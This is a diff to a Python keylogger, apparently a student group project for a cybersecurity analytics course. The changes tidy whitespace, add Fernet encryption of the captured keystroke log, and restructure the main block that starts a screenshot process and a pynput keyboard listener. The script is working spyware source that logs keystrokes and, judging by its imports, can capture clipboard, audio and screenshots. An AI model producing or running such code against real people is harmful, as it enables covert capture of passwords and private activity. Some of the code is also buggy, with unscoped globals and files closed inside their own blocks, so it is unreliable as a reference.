@@ -13,30 +13,33 @@ import win32clipboard
 from pynput.keyboard import Key, Listener
 
 import time
-import os 
+import os
 
 from scipy.io.wavfile import write
-import sounddevice as sd 
+import sounddevice as sd
 
 from cryptography.fernet import Fernet
 
 import getpass
-from requests import get 
+from requests import get
 
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
-
 
 # default variables
 keys_info = "key_log.txt"
 file_path = "C:\\Users\\natal\\OneDrive - csulb\\Academics\\Grad School\\2. CSULB\\Courses\\4. Fall 2023\\IS 665 - Cybersec Analytics\\Group Project - Keyloger"
 extend = "\\"
 
-
-# create a basic 
+# create a basic
 # initialize variables
-count = 0 
+count = 0
 keys = []
+
+# Generate a key for encryption
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
+
 
 def on_press(key):
     """Called when a key is pressed"""
@@ -44,28 +47,36 @@ def on_press(key):
 
     print(key)
     keys.append(key)
-    count += 1 
+    count += 1
 
     if count >= 1:
         count = 0
         write_file(keys)
         keys = []
 
+
 def write_file(keys):
     """Write keys to a file"""
     with open(file_path + extend + keys_info, "a") as f:
         for key in keys:
-            k = str(key).replace("'", "") # convert key to str and remove single quotes
-            if k.find("space") > 0: # write a new line if key is spacebar
+            k = str(key).replace("'", "")  # convert key to str and remove single quotes
+            if k.find("space") > 0:  # write a new line if key is spacebar
                 f.write('\n')
                 f.close()
-            elif k.find("Key") == -1: # filter out special keys (Ctrl, Shift, Alt, etc)
+            elif k.find("Key") == -1:  # filter out special keys (Ctrl, Shift, Alt, etc)
                 f.write(k)
                 f.close()
 
+    # Encrypt the key log file
+    with open(file_path + extend + keys_info, "rb") as original_file:
+        encrypted_data = cipher_suite.encrypt(original_file.read())
+    with open(file_path + extend + keys_info + ".encrypted", "wb") as encrypted_file:
+        encrypted_file.write(encrypted_data)
+
+
 def on_release(key):
     """Stop keylogger if Esc is released"""
-    if key == Key.esc: # if esc is entered, exit keylogger
+    if key == Key.esc:  # if esc is entered, exit keylogger
         return False
 
 
@@ -77,8 +88,10 @@ def screenshot():
 
 if __name__ == "__main__":
     freeze_support()
+
+    # Start the screenshot process
     Process(target=screenshot).start()
 
-# Listener for keyboard events
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    # Listener for keyboard events
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
